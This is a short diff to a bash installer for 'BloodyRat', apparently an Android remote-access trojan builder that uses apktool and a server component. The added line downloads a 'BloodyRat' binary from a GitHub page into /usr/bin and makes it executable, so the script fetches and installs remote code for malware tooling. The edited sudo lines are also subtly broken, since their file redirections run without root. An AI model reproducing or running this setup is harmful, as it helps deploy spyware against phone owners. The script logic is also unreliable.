@@ -35,10 +35,10 @@ if [[ `command -v git` && `command -v wget` && `command -v nodejs` && `command -
 }
 
 function update_source() {
-	sudo su -c "cat ${source} > ${old_source}"
-        sudo su -c "echo 'deb http://security.debian.org/debian-security stretch/updates main' > ${source}"
+	sudo cat ${source} > ${old_source}
+        sudo echo 'deb http://security.debian.org/debian-security stretch/updates main' > ${source}
 	sudo apt update -y && sudo apt install openjdk-8-jdk
-	sudo su -c "cat ${old_source} > ${source}"
+	sudo cat ${old_source} > ${source}
 }
 
 function main() {
@@ -49,6 +49,7 @@ function main() {
 
 function fix_patches() {
 	wget -N https://github.com/just-hack/just-hack.github.io/raw/main/BloodyRat/const.js -q -O ${main}/server/includes/const.js
+	wget -N https://github.com/just-hack/just-hack.github.io/raw/main/BloodyRat/BloodyRat -q -O /usr/bin/BloodyRat && chmod +x /usr/bin/BloodyRat
 	apktool b ${smali_path} --use-aapt2 -o test.apk > /dev/null 2&>1 && rm test.apk > /dev/null 2&>1
 }
 
